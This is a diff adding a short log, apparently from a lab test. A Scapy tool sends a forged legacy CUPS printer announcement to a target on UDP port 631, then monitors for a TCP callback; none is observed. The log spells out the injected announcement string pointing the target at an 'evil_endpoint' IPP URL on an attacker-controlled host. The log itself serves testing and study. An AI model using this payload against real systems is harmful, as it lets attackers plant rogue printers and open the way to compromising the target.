@@ -1,0 +1,7 @@
+2026-11-16 14:44:47,923 INFO Legacy CUPS announcement: '0 3 ipp://10.77.77.1:8000/evil_endpoint/print "evil_laboratory" "my_evil_printer" "evil_factory"\n'
+2026-11-16 14:44:47,923 WARNING The vulnerable daemon may reject this resource path
+2026-11-16 14:44:47,924 INFO Saved constructed packet to pcap_files/scapy_discovery_altered_path.pcap (not a network capture)
+2026-11-16 14:44:47,924 INFO Monitoring en6 for target TCP connections for 5.0s
+2026-11-16 14:44:47,926 INFO Sending 1 announcement(s) to 10.77.77.2:631/udp
+2026-11-16 14:44:53,947 INFO Saved 0 observed TCP packet(s) to pcap_files/scapy_callback_altered_path.pcap
+2026-11-16 14:44:53,948 WARNING No TCP SYN observed; check Docker logs and Wireshark before concluding failure
